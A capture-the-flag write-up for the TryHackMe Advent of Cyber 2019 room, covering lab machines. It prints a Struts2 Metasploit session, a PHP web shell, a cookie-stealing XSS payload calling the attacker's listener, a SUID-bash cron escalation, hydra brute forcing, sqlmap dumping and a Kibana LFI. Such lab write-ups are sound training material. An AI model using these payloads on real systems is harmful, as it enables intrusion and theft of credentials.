# Advent of Cyber 2019

**Room link:** https://tryhackme.com/room/25daysofchristmas

These are mostly easy challenges, we usually only provide a general idea of the process to follow.

## Day 1

The cookie is URL-encoded base64.

## Day 2

A comment on the hidden page leads to some default credentials.

## Day 3

Used `john` & `rockyou.txt` for the shadow.

## Day 4

There exists an unprotected backup of the `/etc/shadow` file...

## Day 5

Don't forget the [wayback machine](https://archive.org/web/)...

## Day 6

The DNS-exfiltrated data simply is hex-encoded.

Used `zip2john` & `john` & `rockyou.txt` for the ZIP.

Used `steghide` with empty passphrase for the JPEG.

## Day 7

_Basic `nmap -A`._

## Day 8

The port is 65534...

`find` is the first key (another option was `nmap` but it does not work here, it actually drops the privileges when running a script), `system-control` the second one.

## Day 9

```python
import requests

URL = 'http://10.10.***.***:3000/'

values = []
subdir = ''
while subdir != 'end':
    req = requests.get(URL + subdir)
    ans = req.json()
    values.append(ans['value'])
    subdir = ans['next']
values.pop()  # 'end'
print(''.join(values))
```

## Day 10

1. Straightforward Metasploit [exploit](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/struts2_content_type_ognl.md):

```
$ msfconsole
msf6 > search struts2
msf6 > use 1
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 10.10.***.**
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.9.***.***
msf6 exploit(multi/http/struts2_content_type_ognl) > check
[+] 10.10.***.**:80 - The target is vulnerable.
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit
meterpreter > shell
id
uid=0(root) gid=0(root) groups=0(root)
find / -name '*Flag*' -type f 2>/dev/null
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
**REDACTED**
cat /home/santa/ssh-creds.txt
santa:**REDACTED**
```

2. Log in as `santa` through SSH (otherwise the lists do not appear).

```
$ ssh santa@$TARGET_IP
[santa@ip-10-10-***-** ~]$ cat -n naughty_list.txt | grep 148
   148  **REDACTED**
[santa@ip-10-10-***-** ~]$ cat nice_list.txt | tail -n+52 | head -1
**REDACTED**
```

## Day 11

1. `nmap` reveals FTP, SSH (useless here), NFS and MySQL services on standard ports.

2. NFS

```
$ showmount --exports $TARGET_IP
Export list for 10.10.***.**:
/opt/files *
$ mkdir /tmp/mynfs
$ sudo mount -t nfs $TARGET_IP:/opt/files /tmp/mynfs
$ cat /tmp/mynfs/creds.txt
**REDACTED**
```

3. FTP allows `anonymous` login and contains the credentials to access MySQL.

4. MySQL

```
$ mysql -u root -p -h $TARGET_IP
...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
...
mysql> use data;
...
Database changed
mysql> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
...
mysql> select * from USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | **REDACTED** |
+-------+--------------+
```

## Day 12

We are given:
 - the GPG (AES) key `25daysofchristmas`;
 - the RSA private key passphrase `hello`.

```
$ gpg -d note1.txt.gpg
gpg: données chiffrées avec AES
gpg: chiffré avec 1 phrase secrète
**REDACTED**
$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt 
Enter pass phrase for private.key:
**REDACTED**
```

## Day 13

1. `nmap -Pn -A`) reveals HTTP and RDP services on standard ports on a Windows system.

2. On the HTTP server, `gobuster` helps discover a `/retro` directory containing a Wordpress blog. The second oldest post goes:

```
Ready Player One
by Wade

(...) I honestly feel a deep connection to the main character Wade.
I keep mistyping the name of his avatar whenever I log (...)
```

which allows to guess the password (Wade's avatar in [Ready player One](https://en.wikipedia.org/wiki/Ready_Player_One)) for user `wade`.

3. **[Dead end]** This allows to log in into the Wordpress panel (with administrator's role) and then:
* Use Metasploit exploit `unix/webapp/wp_admin_shell_upload` to get a meterpreter and a reverse shell. Except the server runs under Windows here...
* Equivalently (this is actually what Metasploit automates), manually install a malicious Wordpress plugin to get a reverse shell. One would need to find a Windows version though...
* More elementary, edit the theme (_Appearance > Theme Editor_) and inject a (Windows) PHP reverse shell (for instance in the `404.php` template).
  * If the reverse shell is based on writing a binary payload (e.g. crafted by `msfvenom`) and running it (such as [this example](https://github.com/Dhayalanb/windows-php-reverse-shell)), then it will be neutralized by Windows Defender (_you see the alerts if you are connected through RDP as done below_). Some more advanced `msfvenom` options can help hiding the signature of the payload to bypass the malware detection, but this gets tedious...
  * We could not get some [reverse powershell payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) to work either...
* Even more elementary, one can inject a simple [PHP web shell](https://github.com/JohnTroony/php-webshells):

```php
<?php header('Content-type: text/plain'); system($_GET['cmd']); ?>
```

```
$ curl http://$TARGET_IP/retro/wp-content/themes/90s-retro/404.php?cmd=whoami
nt authority\iusr
```

But **anyways** we would get logged in as the **default anonymous user** and could not even access Wade's home... Exploiting some Wordpress vulnerabilities might also be an option, but this probably would not help for that exact same reason.

3. **[Working approach]** Use these Wordpress credentials to connect through RDP using Remmina! The **user flag** in on Wade's desktop.

4. To escalate privileges, you are hinted to look at what the user was last trying to do. Conveniently, there is a `hhupd.exe` file on the desktop which, after some research, seems to correspond to [this amazing exploit (CVE-2019-1388)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#cve-2019-1388)! We get a `cmd` as `nt authority\system` and grab the **root flag**:
```
> type C:\Users\Administrator\Desktop\root.txt
**REDACTED**
```

## Day 14

_As you need to create an AWS account for this one, I looked for a [write-up](https://medium.com/@ratiros01/tryhackme-advent-of-cyber-3b64a0fe8199) instead._

## Day 15

Call `getNote('/etc/shadow', '#note-1')` in a JS console (then use `john` & `rockyou.txt`).

## Day 16

Python code to extract EXIF data using `exiftool`:

```python
import subprocess

def exiftool(fname):
    proc = subprocess.run(('exiftool', fname), capture_output=True)
    metadata = {}
    for line in proc.stdout.decode().rstrip('\n').split('\n'):
        i = line.index(':')
        field, value = line[:i].rstrip(), line[i+2:]
        metadata[field] = value
    return metadata
```

Python code to extract strings from a binary (similar to the `strings` command):

```python
def strings_in_binary(fname):
    printable = lambda c: 32 <= c < 127
    F = open(fname, 'rb')
    curr = []
    eof = False
    while not eof:
        c = F.read(1)
        if c:
            c = c[0]
        else:
            c = 0
            eof = True
        if printable(c):
            curr.append(chr(c))
        else:
            string = ''.join(curr).strip()
            if string:
                yield string
            curr.clear()
```

Python script to solve the challenge (to run in a fresh directory where the original archive was unzipped):

```python
import os, zipfile

cnt = cnt_v11 = 0
for zname in os.listdir():
    if zname.endswith('.zip'):
        Z = zipfile.ZipFile(zname)
        for fname in Z.namelist():
            cnt += 1
            Z.extract(fname)
            meta = exiftool(fname)
            if meta.get('Version', None) == '1.1':
                cnt_v11 += 1
            for s in strings_in_binary(fname):
                if 'password' in s:
                    print(fname, s)
print(f'{cnt} files')
print(f'{cnt_v11} files with Version: 1.1')
```

## Day 17

```
$ hydra -l molly -P rockyou.txt $TARGET_IP http-post-form '/login:username=^USER^&password=^PASS^:incorrect'
...
[80][http-post-form] host: 10.10.**.***   login: molly   password: **REDACTED**
...
$ hydra -l molly -P rockyou.txt $TARGET_IP ssh       
...
[22][ssh] host: 10.10.**.***   login: molly   password: **REDACTED**
```

## Day 18

We post the following [XSS payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss) in a comment.

```html
<script>new Image().src="http://10.9.***.***:4444/?stolen="+document.cookie;</script>
```

And wait for the incoming request.

```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.**.*** 42376
GET /?stolen=authid=**REDACTED** HTTP/1.1
Host: 10.9.***.***:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```

## Day 19

Simply append any URL-encoded shell command to `/api/cmd/`.

```
$ curl "http://$TARGET_IP:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser%2Etxt"
```

## Day 20

1. Brute-force into.

```
$ hydra -l sam -P rockyou.txt -s 4567 $TARGET_IP ssh
```

2. Replace the content of `/home/scripts/clean_up.sh` with:

```
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Wait a minute.

```
sam@ip-10-10-**-**:/home/scripts$ /tmp/rootbash -p
rootbash-4.3# cat /home/ubuntu/flag2.txt 
**REDACTED**
```

## Days 21 & 22

_Very basic introduction to `radare2`._

## Day 23

1. SQLi

```
$ sqlmap --data="log_email=1&log_password=2&login_button=Login" -u "http://$TARGET_IP/register.php" --dbms=MySQL -p log_email --dump
```

We identify Santa's email `bigman@shefesh.com` and [crack](https://crackstation.net/) his password hash.

2. Log in and post a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) using a `.phtml` extension as the attachment to a comment.

```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.***.*** 55982
Linux server 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:31:12 up  1:30,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /home/user/flag.txt
**REDACTED**
```

## Day 24

1. `nmap -sV`

```
PORT     STATE SERVICE   REASON          VERSION
22/tcp   open  ssh       syn-ack ttl 254 OpenSSH 7.4 (protocol 2.0)
111/tcp  open  rpcbind   syn-ack ttl 254 2-4 (RPC #100000)
5601/tcp open  esmagent? syn-ack ttl 254
8000/tcp open  http      syn-ack ttl 254 SimpleHTTPServer 0.6 (Python 3.7.4)
9200/tcp open  http      syn-ack ttl 254 Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
9300/tcp open  vrace?    syn-ack ttl 254
2 services unrecognized despite returning data.
```

Investigating further, we find:
  * A Kibana 6.4.2 log file `http://$TARGET_IP:8000/kibana-log.txt` on the HTTP server;
  * Kibana on port 5610.

2. Using [Elasticsearch API](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html), we find the (actually useless) requested password.

```
$ curl -s "http://10.10.118.26:9200/_search?q=*pass*" | jq
{
...
  "hits": {
...
    "hits": [
      {
        "_index": "messages",
...
        "_source": {
          "sender": "mary",
          "receiver": "wendy",
          "message": "hey, can you access my dev account for me. My username is l33tperson and my password is **REDACTED**"
        }
      }
    ]
  }
}
```

3. Looking for vulnerabilities, we discover a [Kibana < 6.4.3 LFI (CVE-2018-17246)](https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it) allowing to execute any local JS code. There does not seem to be a way to upload some code to the server (e.g. to get a reverse shell), but it is good enough here to include the **root flag** file and to read the resulting error in the log.

```
$ curl "http://$TARGET_IP:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../root.txt"
Ctrl-C
$ curl -s http://$TARGET_IP:8000/kibana-log.txt | tail -1 | jq
{
...
  "error": {
    "message": "Unhandled promise rejection. (...) (rejection id: 15)",
    "name": "UnhandledPromiseRejectionWarning",
    "stack": "ReferenceError: **REDACTED** is not defined\n    at Object.<anonymous> (/root.txt:1:6) (...)"
  },
...
}
```
